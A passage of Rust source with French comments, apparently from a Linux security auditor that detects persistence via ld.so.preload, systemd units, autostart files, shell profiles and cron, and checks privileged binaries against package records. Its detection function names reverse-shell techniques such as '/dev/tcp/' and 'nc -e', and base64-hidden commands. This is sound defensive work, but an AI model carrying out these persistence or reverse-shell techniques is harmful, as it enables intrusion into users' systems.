//! Ce qui se cache : persistance (préchargement, services, démarrage de session, cron), programmes
//! privilégiés hors paquet ou modifiés, PATH piégeable.

#![warn(clippy::arithmetic_side_effects, clippy::as_conversions)]

use super::designes::{self, Designe};
use super::*;
use crate::machine::temoins;

/// /usr/bin/x → /bin/x (idem sbin, lib) : chemin d'avant la fusion de /usr.
pub(super) fn chemin_hors_usr(fichier: &Path) -> Option<std::path::PathBuf> {
    let reste = fichier.strip_prefix("/usr").ok()?;
    ["bin", "sbin", "lib", "lib64"]
        .iter()
        .any(|d| reste.starts_with(d))
        .then(|| Path::new("/").join(reste))
}

/// Paquet donné par « dpkg -S » : « libc6:amd64, libc6-dbg: /chemin » → « libc6:amd64 ». Les lignes
/// « diversion by … » parlent d'un fichier détourné, pas de son propriétaire.
pub(super) fn paquet_dpkg(texte: &str) -> Option<String> {
    texte
        .lines()
        .filter(|l| !l.starts_with("diversion "))
        .find_map(|l| l.split_once(": ")?.0.split(", ").next().map(str::to_string))
}

/// Empreinte SHA-256 enregistrée pour ce fichier dans le mtree d'un paquet pacman (« ./usr/bin/sudo … sha256digest=… »).
pub(super) fn empreinte_mtree(mtree: &str, fichier: &Path) -> Option<String> {
    let debut = format!(".{} ", fichier.display());
    mtree
        .lines()
        .find(|l| l.starts_with(&debut))?
        .split_whitespace()
        .find_map(|c| c.strip_prefix("sha256digest="))
        .map(str::to_string)
}

/// Sortie de dpkg --verify ou rpm -V : le 3e caractère vaut « 5 » quand le contenu (empreinte) a changé.
/// Les autres différences (date, droits) ne prouvent pas un remplacement du programme.
pub(super) fn contenu_modifie(verif: &str, fichier: &Path) -> bool {
    let chemin = fichier.to_string_lossy();
    verif
        .lines()
        .any(|l| l.split_whitespace().last() == Some(&*chemin) && l.chars().nth(2) == Some('5'))
}

/// Dossiers du PATH dangereux : modifiables par tout le monde (sans « sticky bit ») ou relatifs (« . »).
pub(super) fn path_dangereux(path: &str, droits: impl Fn(&str) -> Option<u32>) -> Vec<String> {
    path.split(':')
        .filter(|d| d.is_empty() || !d.starts_with('/') || droits(d).is_some_and(|m| m & 0o002 != 0 && m & 0o1000 == 0))
        .map(|d| {
            if d.is_empty() {
                "(vide = dossier courant)".to_string()
            } else {
                d.to_string()
            }
        })
        .collect()
}

/// Un fichier de démarrage ou de configuration tel qu'il est montré : « ~/… » sous le dossier personnel `maison`, et
/// rendu inoffensif (dans /etc/profile.d ou ~/.config/autostart, le nom est celui qu'a choisi qui a posé le fichier).
pub(super) fn court(p: &Path, maison: &Path) -> String {
    crate::ui::affichable(
        &p.strip_prefix(maison)
            .map_or_else(|_| p.display().to_string(), |r| format!("~/{}", r.display())),
    )
}

/// Ligne de configuration vide ou en commentaire (shell, systemd, .desktop : « # » ; Lua : « -- » ; « ; »).
pub(super) fn commentaire(ligne: &str) -> bool {
    let l = ligne.trim_start();
    l.is_empty() || l.starts_with('#') || l.starts_with("--") || l.starts_with(';') || l.starts_with("//")
}

/// Dossiers cachés du dossier personnel où vivent normalement des programmes.
pub(super) const DOSSIERS_CACHES_NORMAUX: [&str; 10] = [
    ".local",
    ".config",
    ".cargo",
    ".rustup",
    ".nix-profile",
    ".npm-global",
    ".bun",
    ".deno",
    ".dotnet",
    ".steam",
];

/// Pourquoi cette commande lancée automatiquement ressemble à une porte dérobée, ou `None`. `lancement` : la ligne
/// est une commande lancée (service, démarrage de session), pas un fichier de configuration du shell, où « /tmp »
/// apparaît sans rien lancer. Seules des formes précises sont retenues, pour ne pas alerter sur chaque script maison.
pub(super) fn commande_suspecte(commande: &str, lancement: bool) -> Option<&'static str> {
    let mots: Vec<&str> = commande.split_whitespace().collect();
    // Les mots coupés aussi sur ce qui sépare ou groupe les commandes du shell, comme pour la chasse :
    // « (nc -e /bin/sh … &) » ou « x;nc -e … » cachaient nc dans « (nc » ou « x;nc ». Un programme se compare par
    // son nom de fichier (« /bin/nc »), une option telle quelle.
    let mots_du_shell: Vec<&str> = crate::machine::chasse::mots(commande)
        .into_iter()
        .map(|(m, _)| m)
        .collect();
    let a = |m: &str| {
        mots_du_shell
            .iter()
            .any(|x| x.trim_matches(|c| c == '"' || c == '\'') == m || crate::machine::chasse::nom_de_fichier(x) == m)
    };
    if commande.contains("/dev/tcp/") || commande.contains("/dev/udp/") {
        return Some(tr!(
            "connexion réseau ouverte par le shell (shell inversé)",
            "network connection opened by the shell (reverse shell)"
        ));
    }
    if (a("nc") || a("ncat") || a("netcat")) && (a("-e") || a("-c")) {
        return Some(tr!(
            "netcat qui donne un shell (shell inversé)",
            "netcat giving a shell (reverse shell)"
        ));
    }
    // Téléchargé ou décodé puis passé à un interpréteur : le même jugement que pour les programmes en marche.
    if let Some(motif) = crate::machine::chasse::passe_a_un_shell(commande) {
        return Some(motif.raison);
    }
    if commande.contains("base64 -d") || commande.contains("base64 --decode") {
        return Some(tr!("commande cachée en base64", "command hidden in base64"));
    }
    if !lancement {
        return None;
    }
    // Programme lancé : premier mot, sans les préfixes de systemd (« -/usr/bin/x », « @ », « + », « ! »).
    let programme = mots
        .first()?
        .trim_matches(|c| c == '"' || c == '\'')
        .trim_start_matches(['-', '@', '+', '!', ':']);
    if ["/tmp/", "/var/tmp/", "/dev/shm/"]
        .iter()
        .any(|d| programme.starts_with(d))
    {
        return Some(tr!(
            "programme lancé depuis un dossier temporaire",
            "program started from a temporary folder"
        ));
    }
    let maison = home();
    let relatif = programme
        .strip_prefix("~/")
        .or_else(|| programme.strip_prefix("$HOME/"))
        .or_else(|| programme.strip_prefix("%h/"))
        .or_else(|| {
            (!maison.is_empty())
                .then(|| programme.strip_prefix(&format!("{maison}/")))
                .flatten()
        });
    if let Some(r) = relatif {
        let premier = r.split('/').next().unwrap_or("");
        if premier.starts_with('.') && r.contains('/') && !DOSSIERS_CACHES_NORMAUX.contains(&premier) {
            return Some(tr!(
                "programme rangé dans un dossier caché du dossier personnel",
                "program stored in a hidden folder of the home folder"
            ));
        }
    }
    None
}

/// Commande lancée par une ligne de démarrage : « ExecStart=… » (systemd), « Exec=… » (.desktop),
/// « exec-once = … » (Hyprland), « o.exec_on_start("…") » (Omarchy en Lua). `None` si la ligne ne lance rien.
pub(super) fn commande_lancee(ligne: &str) -> Option<String> {
    let l = ligne.trim();
    if commentaire(l) {
        return None;
    }
    if let Some((cle, valeur)) = l.split_once('=') {
        let cle = cle.trim();
        if cle.starts_with("Exec") || ["exec-once", "exec", "exec-shutdown"].contains(&cle) {
            return Some(valeur.trim().to_string());
        }
    }
    if ["exec_on_start", "launch_on_start", "exec_once", "exec-once"]
        .iter()
        .any(|m| l.contains(m))
    {
        let debut = l.find(['"', '\''])?;
        let fin = l.rfind(['"', '\''])?;
        // `get` rend `None` quand la fin précède le début : le même cas que `fin > debut` refusait.
        return l.get(debut.checked_add(1)?..fin).map(str::to_string);
    }
    None
}

/// Ligne qui précharge une bibliothèque dans tous les programmes (LD_PRELOAD, LD_AUDIT) ; « unset » la retire.
pub(super) fn definit_prechargement(ligne: &str) -> bool {
    !commentaire(ligne)
        && (ligne.contains("LD_PRELOAD") || ligne.contains("LD_AUDIT"))
        && !ligne.trim_start().starts_with("unset")
}

/// Fichiers d'un dossier (et de ses sous-dossiers « *.d » de systemd), liens vers un fichier compris ; les liens
/// d'activation (dossiers « *.wants ») ne sont pas parcourus.
pub(super) fn fichiers_de(dossier: &Path, extensions: &[&str]) -> Vec<std::path::PathBuf> {
    let mut trouve = Vec::new();
    for e in std::fs::read_dir(dossier).into_iter().flatten().flatten() {
        let p = e.path();
        let Ok(t) = e.file_type() else { continue };
        // Un lien vers un fichier ordinaire se lit comme lui : sinon, une unité acceptée remplacée par un lien vers
        // une autre sortirait de la lecture (et son alerte avec). Jamais un lien vers un dossier (une boucle).
        let fichier = t.is_file() || (t.is_symlink() && std::fs::metadata(&p).is_ok_and(|m| m.is_file()));
        if t.is_dir() && (p.extension().is_some_and(|x| x == "d") || dossier.ends_with("hypr")) {
            trouve.extend(fichiers_de(&p, extensions));
        } else if fichier && p.extension().is_some_and(|x| extensions.iter().any(|e| x == *e)) {
            trouve.push(p);
        }
    }
    trouve
}

/// Une ligne signalée dans une clé : sa source et l'empreinte de son texte (jamais le texte, écrit par qui l'a posée).
fn source_de(origine: &str, ligne: &str) -> String {
    format!("{origine}#{}", crate::modele::id::trace(ligne))
}

/// L'objet de l'alerte des lancements : ses lignes signalées, triées et sans double (l'ordre de lecture ne compte
/// pas, deux lignes identiques comptent une fois).
fn objet_des_lancements(mut sources: Vec<String>) -> crate::modele::Objet {
    sources.sort();
    sources.dedup();
    crate::modele::Objet::de("lancements", &sources.join(","))
}

/// Lancements automatiques détournés : bibliothèque préchargée dans tous les programmes, services et démarrage
/// de session qui lancent un shell inversé ou un programme caché, services système ajoutés à la main.
pub(super) fn persistance() -> Vec<Constat> {
    persistance_dans(
        Path::new("/"),
        Path::new(&home()),
        |var| std::env::var_os(var),
        sortie("crontab", &["-l"]),
        Paquets::detecter(),
    )
}

/// La persistance lue sous `racine` (« / » au bilan ; une arborescence fabriquée pour le corpus de détection), le
/// dossier personnel `maison`, les variables de cette session (`variable`), la crontab du compte et le gestionnaire
/// de paquets donnés : la même lecture et le même jugement, sans rien toucher hors de la racine.
pub(super) fn persistance_dans(
    racine: &Path,
    maison: &Path,
    variable: impl Fn(&str) -> Option<std::ffi::OsString>,
    crontab: Option<String>,
    gestion: Option<Paquets>,
) -> Vec<Constat> {
    // Une racine relative (« » au lieu de « / ») ferait lire ld.so.preload, profile.d, cron.d… sous le dossier
    // courant : rien n'y serait, et le verdict serait « sain » (campagne n° 4, M6).
    debug_assert!(
        racine.is_absolute(),
        "racine de la persistance relative : {}",
        racine.display()
    );
    #[cfg(test)]
    tests::RACINE_LUE.with(|r| *r.borrow_mut() = Some(racine.to_path_buf()));
    let mut t = Lancements {
        racine: racine.to_path_buf(),
        maison: maison.to_path_buf(),
        ..Lancements::default()
    };
    lire_prechargement(racine, &variable, gestion, &mut t);
    let (demarrage, hypr) = fichiers_de_demarrage(racine, maison);
    let mut configuration = fichiers_de_configuration(racine, maison);
    // Les fichiers de Hyprland sont aussi des fichiers de configuration, après les autres.
    configuration.extend(hypr);
    juger_configuration(&configuration, &demarrage, maison, &mut t);
    juger_demarrage(&demarrage, maison, &mut t);
    juger_cron(racine, crontab, &mut t);
    let mut constats = vec![constat_des_lancements(t)];
    constats.extend(services_ajoutes(racine, gestion));
    constats
}

/// Les lignes signalées par la lecture de la persistance : critiques, suspectes, et d'où vient chacune (`source_de`,
/// sans langue ni numéro de ligne) : l'objet de l'alerte, qui change dès qu'une autre ligne ou une autre source
/// s'ajoute (accepter les lignes d'aujourd'hui ne tait jamais celles de demain, même dans un fichier déjà signalé).
#[derive(Default)]
struct Lancements {
    critiques: Vec<String>,
    suspects: Vec<String>,
    sources: Vec<String>,
    /// Pour chaque ligne signalée, le fichier et la ligne telle qu'écrite (fin « \r » comprise) qu'un geste de
    /// défense retirerait ; `None` : signalée ailleurs que dans un fichier (variable de la session, crontab du compte).
    retraits: Vec<Option<(String, String)>>,
    /// Pour chaque ligne signalée, ce qu'un choix « normal » lierait (`machine::temoins`), ou pourquoi on ne peut pas.
    temoins: Vec<Result<temoins::Temoin, temoins::Refus>>,
    /// La racine lue et le dossier personnel : où chercher ce qu'une ligne lance.
    racine: std::path::PathBuf,
    maison: std::path::PathBuf,
}

/// Les fichiers que désigne une ligne (`designes`), relevés sous `racine` ; `Err` : la ligne ne dit pas sans ambiguïté
/// ce qu'elle lance, ou l'un d'eux ne se relève pas.
fn cibles(t: &Lancements, d: Designe, ligne: &str) -> Result<Vec<(String, temoins::Etat)>, temoins::Refus> {
    let Designe::Chemins(chemins) = d else {
        return Err(temoins::Refus(trf!(
            "la ligne « {} » ne dit pas sans ambiguïté ce qu'elle lance (variable, sous-commande, tube, joker ou chemin relatif)",
            "the line “{}” does not say unambiguously what it starts (variable, subcommand, pipe, wildcard or relative path)",
            crate::ui::couper(&crate::ui::affichable(ligne.trim()), 80)
        )));
    };
    chemins
        .into_iter()
        .map(|c| {
            // Sous une racine fabriquée (corpus), un chemin absolu se lit sous elle ; le dossier personnel y est déjà.
            let lu = if t.racine == Path::new("/") || Path::new(&c).starts_with(&t.racine) {
                std::path::PathBuf::from(&c)
            } else {
                t.racine.join(c.trim_start_matches('/'))
            };
            // Montré (et lié) comme « ~/… » dans le dossier personnel : le même fichier pour le même compte. Pas
            // nettoyé ici (`court`) : le témoin lie le chemin exact et ne nettoie que ce qu'il montre.
            let montre = Path::new(&c)
                .strip_prefix(&t.maison)
                .map_or_else(|_| c.clone(), |r| format!("~/{}", r.to_string_lossy()));
            temoins::etat_de_la_cible(&lu).map(|e| (montre, e))
        })
        .collect()
}

/// Le témoin d'une ligne `l` (numéro `n`, à partir de 0) du fichier `f`, dont `texte` est le contenu lu.
fn temoin_de_ligne(
    t: &Lancements,
    fichier: &Path,
    n: usize,
    texte: &str,
    ligne: &str,
    designe: Designe,
) -> Result<temoins::Temoin, temoins::Refus> {
    let cibles = cibles(t, designe, ligne)?;
    let numero = n.saturating_add(1);
    Ok(temoins::temoin(
        &format!("{}:{numero}", fichier.to_string_lossy()),
        format!("{}:{numero}", court(fichier, &t.maison)),
        ligne,
        Some(&temoins::etat_du_contenant(fichier, texte)),
        &cibles,
    ))
}

/// Le dossier personnel, en texte, pour déplier « ~/ », « $HOME/ », « %h/ ».
fn maison_texte(t: &Lancements) -> String {
    t.maison.to_string_lossy().into_owned()
}

/// La ligne `l` (lue par `lines()`) telle qu'écrite dans `texte`, coupée au seul « \n » comme la relit le fils root.
fn telle_qu_ecrite(texte: &str, l: &str) -> String {
    texte
        .split('\n')
        .find(|r| r.strip_suffix('\r').unwrap_or(r) == l)
        .unwrap_or(l)
        .to_string()
}

/// Le fichier et la ligne à retirer, pour `Lancements::retraits`.
fn retrait(f: &Path, texte: &str, l: &str) -> Option<(String, String)> {
    Some((f.to_str()?.to_string(), telle_qu_ecrite(texte, l)))
}

/// /etc/ld.so.preload : chaque bibliothèque listée est chargée dans TOUS les programmes, root compris. Technique
/// classique des rootkits ; presque aucun système normal n'en a. Puis LD_PRELOAD et LD_AUDIT de cette session.
fn lire_prechargement(
    racine: &Path,
    variable: &impl Fn(&str) -> Option<std::ffi::OsString>,
    gestion: Option<Paquets>,
    t: &mut Lancements,
) {
    let preload = racine.join("etc/ld.so.preload");
    if let Ok(texte) = std::fs::read_to_string(&preload) {
        for (n, ligne, lib) in texte
            .lines()
            .enumerate()
            .filter(|(_, l)| !commentaire(l))
            .flat_map(|(n, l)| l.split_whitespace().map(move |lib| (n, l, lib)))
        {
            let connue = gestion.is_some_and(|g| g.possede(Path::new(lib)));
            t.sources.push(source_de("preload", lib));
            t.retraits.push(retrait(&preload, &texte, ligne));
            let temoin = temoin_de_ligne(t, &preload, n, &texte, ligne, designes::bibliotheques(lib, None));
            t.temoins.push(temoin);
            // Écrit par qui a posé le préchargement (un rootkit, souvent) : montré rendu inoffensif.
            let lib = crate::ui::affichable(lib);
            if connue {
                t.suspects.push(trf!(
                    "/etc/ld.so.preload charge {lib} dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} into every program"
                ));
            } else {
                t.critiques.push(trf!(
                    "/etc/ld.so.preload charge {lib} (hors paquet) dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} (not from a package) into every program"
                ));
            }
        }
    }
    for var in ["LD_PRELOAD", "LD_AUDIT"] {
        if let Some(v) = variable(var).filter(|v| !v.is_empty()) {
            let valeur = v.to_string_lossy();
            t.sources.push(source_de(&format!("env:{var}"), &valeur));
            t.retraits.push(None);
            let temoin = cibles(t, designes::bibliotheques(&valeur, None), &valeur).map(|c| {
                temoins::temoin(
                    &format!("env:{var}"),
                    trf!("{var} de cette session", "{var} of this session"),
                    &valeur,
                    None,
                    &c,
                )
            });
            t.temoins.push(temoin);
            t.suspects.push(trf!(
                "{var}={} est défini pour cette session",
                "{var}={} is set for this session",
                crate::ui::affichable(&v.to_string_lossy())
            ));
        }
    }
}

/// Les fichiers de configuration des sessions (environnement, profils des shells, uwsm), du système puis du compte.
fn fichiers_de_configuration(racine: &Path, h: &Path) -> Vec<std::path::PathBuf> {
    let etc = |chemin: &str| racine.join(chemin);
    let mut configuration: Vec<std::path::PathBuf> = [
        "etc/environment",
        "etc/profile",
        "etc/bash.bashrc",
        "etc/zsh/zshenv",
        "etc/zsh/zprofile",
    ]
    .iter()
    .map(|c| etc(c))
    .collect();
    configuration.extend(fichiers_de(&etc("etc/profile.d"), &["sh", "zsh"]));
    configuration.extend(fichiers_de(&etc("etc/environment.d"), &["conf"]));
    configuration.extend(
        [
            ".profile",
            ".bash_profile",
            ".bashrc",
            ".zshrc",
            ".zshenv",
            ".zprofile",
            ".xprofile",
        ]
        .iter()
        .map(|f| h.join(f)),
    );
    configuration.extend(fichiers_de(&h.join(".config/environment.d"), &["conf"]));
    configuration.extend(fichiers_de(&h.join(".config/uwsm"), &["sh", "conf"]));
    for f in std::fs::read_dir(h.join(".config/uwsm"))
        .into_iter()
        .flatten()
        .flatten()
    {
        if f.file_name().to_string_lossy().starts_with("env") && f.path().is_file() {
            configuration.push(f.path());
        }
    }
    configuration
}

/// Les fichiers dont des lignes lancent des programmes (services, démarrage de session, Hyprland), et ceux de
/// Hyprland à part : ils sont aussi des fichiers de configuration.
fn fichiers_de_demarrage(racine: &Path, h: &Path) -> (Vec<std::path::PathBuf>, Vec<std::path::PathBuf>) {
    let etc = |chemin: &str| racine.join(chemin);
    let mut demarrage = fichiers_de(
        &etc("etc/systemd/system"),
        &["service", "timer", "socket", "path", "conf"],
    );
    demarrage.retain(|p| !p.is_symlink());
    demarrage.extend(fichiers_de(
        &h.join(".config/systemd/user"),
        &["service", "timer", "socket", "path", "conf"],
    ));
    demarrage.extend(fichiers_de(&h.join(".config/autostart"), &["desktop"]));
    demarrage.extend(fichiers_de(&etc("etc/xdg/autostart"), &["desktop"]));
    let hypr = fichiers_de(&h.join(".config/hypr"), &["conf", "lua"]);
    demarrage.extend(hypr.iter().cloned());
    (demarrage, hypr)
}

/// Dans les fichiers de configuration : un préchargement, ou une commande suspecte hors des lignes de démarrage
/// (jugées à part).
fn juger_configuration(
    configuration: &[std::path::PathBuf],
    demarrage: &[std::path::PathBuf],
    h: &Path,
    t: &mut Lancements,
) {
    for f in configuration {
        let Ok(texte) = std::fs::read_to_string(f) else {
            continue;
        };
        for (n, l) in texte.lines().enumerate() {
            if definit_prechargement(l) {
                t.sources
                    .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                t.retraits.push(retrait(f, &texte, l));
                let d = designes::prechargement(l, &maison_texte(t));
                let temoin = temoin_de_ligne(t, f, n, &texte, l, d);
                t.temoins.push(temoin);
                t.suspects.push(trf!(
                    "{}:{} précharge une bibliothèque (LD_PRELOAD)",
                    "{}:{} preloads a library (LD_PRELOAD)",
                    court(f, h),
                    n.saturating_add(1)
                ));
            } else if !commentaire(l)
                && !demarrage.contains(f)
                && let Some(raison) = commande_suspecte(l, false)
            {
                t.sources
                    .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                t.retraits.push(retrait(f, &texte, l));
                let d = designes::commande(l, &maison_texte(t));
                let temoin = temoin_de_ligne(t, f, n, &texte, l, d);
                t.temoins.push(temoin);
                t.suspects.push(trf!(
                    "{}:{} : {raison}",
                    "{}:{}: {raison}",
                    court(f, h),
                    n.saturating_add(1)
                ));
            }
        }
    }
}

/// Dans les fichiers de démarrage : chaque programme lancé, jugé comme un lancement.
fn juger_demarrage(demarrage: &[std::path::PathBuf], h: &Path, t: &mut Lancements) {
    for f in demarrage {
        let Ok(texte) = std::fs::read_to_string(f) else {
            continue;
        };
        for (n, l) in texte.lines().enumerate() {
            let Some(commande) = commande_lancee(l) else {
                continue;
            };
            if let Some(raison) = commande_suspecte(&commande, true) {
                t.sources
                    .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                t.retraits.push(retrait(f, &texte, l));
                let d = designes::commande(&commande, &maison_texte(t));
                let temoin = temoin_de_ligne(t, f, n, &texte, l, d);
                t.temoins.push(temoin);
                t.suspects.push(trf!(
                    "{}:{} : {raison}",
                    "{}:{}: {raison}",
                    court(f, h),
                    n.saturating_add(1)
                ));
            }
        }
    }
}

/// La commande d'une ligne de cron, sans son horaire (« @reboot » ou cinq champs) ni, dans un fichier du système, le
/// compte qui la lance.
fn commande_de_cron(l: &str, systeme: bool) -> String {
    let l = l.trim();
    let champs: usize = match (l.starts_with('@'), systeme) {
        (true, false) => 1,
        (true, true) => 2,
        (false, false) => 5,
        (false, true) => 6,
    };
    l.split_whitespace().skip(champs).collect::<Vec<_>>().join(" ")
}

/// La crontab du compte et celles du système : chaque ligne est une commande.
fn juger_cron(racine: &Path, crontab: Option<String>, t: &mut Lancements) {
    let etc = |chemin: &str| racine.join(chemin);
    let crontab = crontab.unwrap_or_default();
    // La crontab du compte n'a pas de fichier qu'un geste de défense toucherait ; son texte entier est son témoin.
    for (n, l) in crontab.lines().enumerate().filter(|(_, l)| !commentaire(l)) {
        if let Some(raison) = commande_suspecte(l, false) {
            t.sources.push(source_de("crontab", l));
            t.retraits.push(None);
            let numero = n.saturating_add(1);
            let temoin = cibles(t, designes::commande(&commande_de_cron(l, false), &maison_texte(t)), l).map(|c| {
                temoins::temoin(
                    &format!("crontab:{numero}"),
                    format!("crontab:{numero}"),
                    l,
                    Some(&temoins::Etat::Fichier {
                        empreinte: temoins::empreinte_du_texte(crontab.as_bytes()),
                    }),
                    &c,
                )
            });
            t.temoins.push(temoin);
            t.suspects.push(trf!("crontab : {raison}", "crontab: {raison}"));
        }
    }
    let mut fichiers_cron = vec![etc("etc/crontab")];
    fichiers_cron.extend(
        std::fs::read_dir(etc("etc/cron.d"))
            .into_iter()
            .flatten()
            .flatten()
            .map(|e| e.path()),
    );
    for f in fichiers_cron {
        let texte = std::fs::read_to_string(&f).unwrap_or_default();
        let source = crate::ui::chemin_affichable(&f);
        for (n, l) in texte.lines().enumerate().filter(|(_, l)| !commentaire(l)) {
            if let Some(raison) = commande_suspecte(l, false) {
                t.sources.push(source_de(&crate::modele::id::chemin(&source), l));
                t.retraits.push(retrait(&f, &texte, l));
                let d = designes::commande(&commande_de_cron(l, true), &maison_texte(t));
                let temoin = temoin_de_ligne(t, &f, n, &texte, l, d);
                t.temoins.push(temoin);
                t.suspects.push(trf!("{source} : {raison}", "{source}: {raison}"));
            }
        }
    }
}

/// Le constat des lancements : aucun suspect, ou une alerte (critique si une bibliothèque hors paquet est préchargée)
/// qui en nomme six au plus.
fn constat_des_lancements(t: Lancements) -> Constat {
    const CAT: &str = "Persistance";
    let Lancements {
        critiques,
        mut suspects,
        sources,
        mut retraits,
        temoins: releves,
        ..
    } = t;
    suspects.sort();
    suspects.dedup();
    if critiques.is_empty() && suspects.is_empty() {
        return ok(
            CAT,
            tr!(
                "Aucun lancement automatique suspect (préchargement, services, démarrage de session, cron).",
                "No suspicious autostart (preloading, services, session startup, cron)."
            ),
        );
    }
    let niveau = if critiques.is_empty() {
        Niveau::Eleve
    } else {
        Niveau::Critique
    };
    let mut liste = critiques;
    liste.extend(suspects);
    let reste = liste.len().saturating_sub(6);
    liste.truncate(6);
    let mut message = trf!(
        "Lancement automatique suspect : {}",
        "Suspicious autostart: {}",
        liste.join(" ; ")
    );
    if reste > 0 {
        let _ = trw!(message, " ; et {reste} autre(s)", "; and {reste} more");
    }
    message.push('.');
    let constat = alerte(CAT, niveau, message).avec_objet(objet_des_lancements(sources)).manuel(
        tr!("Ne rien lancer : lire chaque ligne signalée et supprimer celles que vous n'avez pas ajoutées, puis lancer l'antivirus", "Do not run anything: read each reported line and delete the ones you did not add, then run the antivirus"),
        &[],
    );
    // Par des gestes de défense seulement si chaque ligne signalée est dans un fichier du système qu'un geste a le
    // droit de modifier : une ligne du dossier personnel, de la crontab du compte ou une variable de la session
    // laisse tout à la main (une correction qui en ferait une partie se croirait complète).
    retraits.dedup();
    let mut vus: Vec<&(String, String)> = Vec::new();
    let mut a_la_main = false;
    for r in &retraits {
        match r {
            Some(r) if !vus.contains(&r) => vus.push(r),
            Some(_) => {}
            None => a_la_main = true,
        }
    }
    let gestes = if a_la_main {
        Vec::new()
    } else {
        crate::machine::defense::tous(vus, |(f, l)| crate::machine::defense::retirer_ligne(f, l))
    };
    crate::machine::defense::corriger(
        constat,
        tr!(
            "Retirer ces lignes (chaque fichier est gardé entier dans sa note, Défaire le remet), puis lancer l'antivirus",
            "Remove these lines (each file is kept whole in its note, Undo puts it back), then run the antivirus"
        ),
        &gestes,
    )
    .avec_temoins(temoins::Temoins::de(releves))
}

/// Services système ajoutés à la main : souvent les tiens (scripts maison), parfois une persistance root. On les nomme
/// pour que tu les reconnaisses, sans baisser la note.
fn services_ajoutes(racine: &Path, gestion: Option<Paquets>) -> Option<Constat> {
    let gestion = gestion?;
    let systeme = racine.join("etc/systemd/system");
    let mut fichiers: Vec<std::path::PathBuf> = fichiers_de(&systeme, &["service", "timer"])
        .into_iter()
        .filter(|p| p.parent() == Some(systeme.as_path()) && !p.is_symlink())
        .filter(|p| !gestion.possede(p))
        .collect();
    fichiers.sort();
    let ajoutes: Vec<String> = fichiers
        .iter()
        .filter_map(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
        .collect();
    // Un choix « normal » est lié au contenu de chaque fichier de service : changé, l'information revient.
    let releves = fichiers
        .iter()
        .map(|f| {
            let texte = std::fs::read_to_string(f).map_err(|e| {
                temoins::Refus(trf!(
                    "{} ne se lit pas ({e})",
                    "{} cannot be read ({e})",
                    crate::ui::chemin_affichable(f)
                ))
            })?;
            let nom = f
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default();
            Ok(temoins::temoin(
                &f.to_string_lossy(),
                crate::ui::chemin_affichable(f),
                &nom,
                Some(&temoins::etat_du_contenant(f, &texte)),
                &[],
            ))
        })
        .collect();
    // Seulement depuis la vraie racine : les noms d'une arborescence fabriquée ne désignent rien de cet ordinateur.
    juger_services_ajoutes(&ajoutes, racine == Path::new("/")).map(|c| c.avec_temoins(temoins::Temoins::de(releves)))
}

/// `ajoutes` : les noms de fichier tels que lus (triés). `gestes` : désactiver chacun par un geste de défense, chacun
/// demandé à part sur le terminal ; jamais une unité de session (connexion à distance, écran de connexion), que
/// l'enfant root refuserait. Un nom qu'un geste ne porte pas (forgé, gabarit) laisse tout à la main.
fn juger_services_ajoutes(ajoutes: &[String], gestes: bool) -> Option<Constat> {
    const CAT: &str = "Persistance";
    let affiches: Vec<String> = ajoutes.iter().map(|n| crate::ui::affichable(n)).collect();
    let premier = affiches.first()?.clone();
    let constat = alerte(
        CAT,
        Niveau::Info,
        trf!(
            "{} service(s) système ajouté(s) à la main, hors paquet : {}. À reconnaître.",
            "{} system service(s) added by hand, not from a package: {}. Check that you recognize them.",
            affiches.len(),
            affiches.join(", ")
        ),
    )
    .avec_objet(crate::modele::Objet::de("services", &affiches.join(",")))
    .manuel(
        tr!(
            "Si vous n'en reconnaissez pas un, lisez ce qu'il lance avant de le désactiver",
            "If you do not recognize one, read what it starts before turning it off"
        ),
        &[&format!("systemctl cat {}", crate::commande::sh_chaine(&premier))],
    );
    if !gestes {
        return Some(constat);
    }
    let gestes = crate::machine::defense::tous(
        ajoutes.iter().filter(|n| !gestes_unix::unite_portant_les_sessions(n)),
        |n| gestes_unix::NomUnite::nouveau(n).map(Defense::DesactiverService),
    );
    Some(crate::machine::defense::corriger(
        constat,
        tr!(
            "Désactiver ceux que vous ne reconnaissez pas (chacun demandé à part ; Défaire les remet) ; « systemctl cat <service> » montre ce qu'il lance",
            "Turn off the ones you do not recognize (each asked separately; Undo puts them back); “systemctl cat <service>” shows what it starts"
        ),
        &gestes,
    ))
}

/// Fichiers listés par « getcap -r » : « /usr/bin/ping cap_net_raw=ep » (ancien format : « /usr/bin/ping = cap_net_raw+ep »).
pub(super) fn fichiers_capacites(texte: &str) -> Vec<std::path::PathBuf> {
    texte
        .lines()
        .filter_map(|l| l.split_once(" = ").or_else(|| l.rsplit_once(' ')))
        .filter(|(f, caps)| f.starts_with('/') && caps.contains("cap_"))
        .map(|(f, _)| std::path::PathBuf::from(f))
        .collect()
}

/// Programmes privilégiés (setuid, setgid, capacités : lancés avec des droits que l'utilisateur n'a pas) là où il ne
/// devrait pas y en avoir, qui n'appartiennent à aucun paquet ou qui ont changé depuis leur installation ; et PATH piégeable.
/// Les fichiers de `d`, jusqu'à `profondeur` sous-dossiers plus bas, qui passent `test`.
fn parcourir(d: &Path, profondeur: u32, trouve: &mut Vec<std::path::PathBuf>, test: &dyn Fn(&Path) -> bool) {
    for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
        let p = e.path();
        if e.file_type().is_ok_and(|t| t.is_dir()) {
            if profondeur > 0 {
                parcourir(&p, profondeur.saturating_sub(1), trouve, test);
            }
        } else if test(&p) {
            trouve.push(p);
        }
    }
}

/// Programmes privilégiés (setuid, setgid, capacités : lancés avec des droits que l'utilisateur n'a pas) là où il ne
/// devrait pas y en avoir, qui n'appartiennent à aucun paquet ou qui ont changé depuis leur installation ; et PATH piégeable.
pub(super) fn fichiers_suspects() -> Vec<Constat> {
    use std::os::unix::fs::MetadataExt;
    use std::os::unix::fs::PermissionsExt;
    let (mut anormaux, systeme, capacites) = programmes_privilegies();
    let gestion = Paquets::detecter();
    let (modifies, non_verifies) =
        gestion.map_or((Vec::new(), 0), |g| comparer_aux_paquets(g, &systeme, &mut anormaux));
    let mode = |p: &Path| std::fs::symlink_metadata(p).ok().map(|m| m.mode());
    let caps = capacites.as_deref().unwrap_or_default();
